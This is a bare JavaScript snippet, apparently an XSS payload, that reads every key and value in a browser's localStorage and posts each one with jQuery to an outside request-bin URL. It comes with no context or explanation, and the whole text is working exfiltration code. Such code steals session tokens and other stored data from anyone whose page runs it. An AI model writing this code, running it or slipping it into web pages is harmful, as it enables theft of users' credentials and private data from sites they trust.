for(var i = 0; i < localStorage.length; i++){
	key=localStorage.key(i); 
	$.post ('https://requestb.in/190f0mk1', key+': '+localStorage.getItem(key));
}
